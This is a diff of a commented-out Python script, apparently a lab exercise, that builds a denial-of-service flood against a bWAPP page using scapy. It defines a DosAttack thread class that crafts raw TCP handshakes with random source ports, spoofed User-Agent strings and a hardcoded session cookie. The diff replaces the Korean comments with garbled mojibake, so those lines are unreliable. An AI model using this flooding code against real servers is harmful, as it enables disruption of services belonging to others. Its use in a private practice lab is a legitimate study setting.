@@ -1,9 +1,9 @@
-# from scapy.all import* #소켓을 사용하기 위해
-# import threading #멀티스레드를 구현하기 위해
-# import time #멀티스레드를 제어하기 위해
-# import string #URL 파라미터의 값 을 바꾸기 위해
-# import random #랜덤한 PORT , IP 등을 위해
-# from fake_useragent import UserAgent #User-Agent 값을 스푸핑 하기 위해
+# from scapy.all import* #?��켓을 ?��?��?���? ?��?��
+# import threading #�??��?��?��?���? 구현?���? ?��?��
+# import time #�??��?��?��?���? ?��?��?���? ?��?��
+# import string #URL ?��?��미터?�� �? ?�� 바꾸�? ?��?��
+# import random #?��?��?�� PORT , IP ?��?�� ?��?��
+# from fake_useragent import UserAgent #User-Agent 값을 ?��?��?�� ?���? ?��?��
 
 
 # from scapy.all import *
@@ -18,24 +18,24 @@
 # class DosAttack(Thread):
 #     def __init__(self,dstip):
 #          Thread.__init__(self)
-#          self.dstip = dstip # 희생자 IP
-#          self.pkcount = 0 # 전체 패킷 양
+#          self.dstip = dstip # ?��?��?�� IP
+#          self.pkcount = 0 # ?���? ?��?�� ?��
 #          self.ack = 0 #ack 번호
-#          self.srcport = RandNum(1024,65535) #랜덤한 출발지 port
-#          self.string = '' #url 파라미터에 추가되는 랜덤한 값
-#          self.srcip = '192.168.100.241' #출발지 IP
-#          self.ua = UserAgent() #스푸핑 user-agent
+#          self.srcport = RandNum(1024,65535) #?��?��?�� 출발�? port
+#          self.string = '' #url ?��?��미터?�� 추�???��?�� ?��?��?�� �?
+#          self.srcip = '192.168.100.241' #출발�? IP
+#          self.ua = UserAgent() #?��?��?�� user-agent
          
 #     def hurk_dos(self):
 #         self.string = "".join(random.choice(string.ascii_lowercase) for _ in range(3))
-#         header = "GET: /bWAPP/xss_get.php?firstname={}&lastname=&form=submit HTTP/1.1\r\n".format(self.string) #헤더생성
+#         header = "GET: /bWAPP/xss_get.php?firstname={}&lastname=&form=submit HTTP/1.1\r\n".format(self.string) #?��?��?��?��
 #         print(header)
 #         header += "Host:{}\r\n".format(self.srcip)
 #         header += "Cache-Control:no-cache \r\n" #Cache-Control = no-cache
 #         header += "User-Agent:"+self.ua.random+"\r\n"
-#         header += "Cookie: PHPSESSID=4u6q2403srssfrku7kqf8ir2u2; security_level=0\r\n" #세션 유지 cookie 추가
+#         header += "Cookie: PHPSESSID=4u6q2403srssfrku7kqf8ir2u2; security_level=0\r\n" #?��?�� ?���? cookie 추�??
 #         header += "\r\n"
-#         packet = sr1(IP(src=self.srcip,dst=self.dstip)/TCP(sport=self.srcport,dport=80,seq=0,flags="S")) #패킷 생성
+#         packet = sr1(IP(src=self.srcip,dst=self.dstip)/TCP(sport=self.srcport,dport=80,seq=0,flags="S")) #?��?�� ?��?��
 #         print(packet)
 #         syn_ack = packet
 #         # ack = IP(src=packet.src,dst=self.dstip)/TCP(sport=syn_ack.dport, dport=80, flags="A", seq=syn_ack.ack, ack=syn_ack.seq+1)/header
@@ -113,3 +113,5 @@ main()
 
 # 192.168.100.252
 
+
+# 192.168.100.2
